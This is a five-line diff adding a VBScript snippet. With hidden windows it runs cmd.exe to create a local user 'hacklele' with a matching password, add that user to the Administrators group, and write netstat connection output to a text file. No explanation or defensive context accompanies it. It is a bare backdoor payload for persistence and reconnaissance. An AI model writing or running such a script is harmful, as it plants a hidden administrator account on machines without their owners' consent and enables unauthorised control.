@@ -1,0 +1,5 @@
+vbs:
+setwshshell=createobject ("wscript.shell")
+a=wshshell.run ("cmd.exe /c net user hacklele hacklele /add",0)
+b=wshshell.run ("cmd.exe /c net localgroup Administrators hacklele /add",0)
+c=wshshell.run ("cmd.exe /c netstat -ano >> 1.txt ",0)
